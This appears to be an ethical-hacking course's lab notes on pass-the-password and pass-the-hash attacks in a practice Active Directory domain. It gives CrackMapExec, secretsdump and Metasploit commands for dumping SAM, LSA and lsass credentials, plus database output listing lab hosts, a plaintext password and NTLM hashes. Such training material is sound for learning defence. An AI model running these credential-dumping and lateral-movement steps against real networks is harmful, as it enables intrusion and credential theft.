# I. Pass Attacks Overview

Pass attacks are a type of cyber attack where an attacker steals the hashed password of a user in an attempt to authenticate as that user without needing to know the plaintext password.

So, if we manage to crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks.

This attack can be conducted in a variety of ways, make sure all machines are turned on.

- **Pass the Password.** `crackmapexec smb <IP/CIDR> -u <user> -d <domain> -p <pass>`.

![passthepassword1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/914fecbc-c4cf-475e-b15e-1529bd3a3d0b)

- **Grab the Local Hashes with Metasploit.** `windows/smb/psexec` **OR using secretsdump.py.** `secretsdump.py <DOMAIN>/<user>:<pass>@DOMAIN IP`

**Pass the Hash.** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth`

![passthehash1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/4c5ca120-8722-4ec0-abab-3d4df69b2d10)

- **Dump valuable data** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --sam`.

![passthehash2](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/835e9fa7-8e40-47e5-83c0-854e77bda835)

- E**numerate shares** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --shares`.

![passthehash3](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/550ed0a8-9828-48fe-83b9-fce83f052007)

- **Dump LSA (Local Security Authority).** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --lsa`.

![passthehash4](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/42b51df5-6b49-434f-b1be-b022b741deb8)

- **Check for different modules.** `crackmapexec smb -L`.
- **Dump lsass to get credentials in real-time.** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth -M lsassy`.
- **Access the Crackmapexec database (cmedb).**
    
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ cmedb 
    cmedb (default)(smb) > help
    
    Documented commands (type help <topic>):
    ========================================
    clear_database  creds  dpapi  exit  export  groups  help  hosts  shares  wcc
    
    Undocumented commands:
    ======================
    back  import
    
    cmedb (default)(smb) > hosts
    
    +Hosts---+-----------+-----------+--------------+----------------+--------------------------+-------+---------+---------+-----------+------------+
    | HostID | Admins    | IP        | Hostname     | Domain         | OS                       | SMBv1 | Signing | Spooler | Zerologon | PetitPotam |
    +--------+-----------+-----------+--------------+----------------+--------------------------+-------+---------+---------+-----------+------------+
    | 1      | 0 Cred(s) | 10.0.2.8  | STRAWHATS-PC | ONEPIECE.local | Windows 10.0 Build 17763 | False | True    | None    | None      | None       |
    | 2      | 2 Cred(s) | 10.0.2.11 | FRANKY       | ONEPIECE.local | Windows 10.0 Build 19041 | False | False   | None    | None      | None       |
    | 3      | 0 Cred(s) | 10.0.2.2  | WIZZLE       | Wizzle         | Windows 10.0 Build 19041 | False | False   | None    | None      | None       |
    | 4      | 2 Cred(s) | 10.0.2.10 | USOPP        | ONEPIECE.local | Windows 10.0 Build 19041 | False | False   | None    | None      | None       |
    +--------+-----------+-----------+--------------+----------------+--------------------------+-------+---------+---------+-----------+------------+
    
    cmedb (default)(smb) > creds
    
    +Credentials---------+-----------+----------------+--------------------+-------------------------------------------------------------------+
    | CredID | Admin On  | CredType  | Domain         | UserName           | Password                                                          |
    +--------+-----------+-----------+----------------+--------------------+-------------------------------------------------------------------+
    | 1      | 2 Host(s) | plaintext | ONEPIECE.local | Franky             | Password1                                                         |
    | 2      | 1 Host(s) | hash      | USOPP          | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
    | 3      | 1 Host(s) | hash      | FRANKY         | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
    | 4      | 0 Host(s) | hash      | FRANKY         | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
    | 5      | 0 Host(s) | hash      | FRANKY         | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
    | 6      | 0 Host(s) | hash      | USOPP          | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
    | 7      | 0 Host(s) | hash      | FRANKY         | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:4320ef599b0861e59eabb8b16ccf520f |
    | 8      | 0 Host(s) | hash      | USOPP          | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
    | 9      | 0 Host(s) | hash      | FRANKY         | Suuuper            | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
    | 10     | 0 Host(s) | hash      | USOPP          | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:296a91fa7ca4e02965019fa6b69765dd |
    | 11     | 0 Host(s) | hash      | USOPP          | Sogeking           | aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0 |
    +--------+-----------+-----------+----------------+--------------------+-------------------------------------------------------------------+
    
    ```
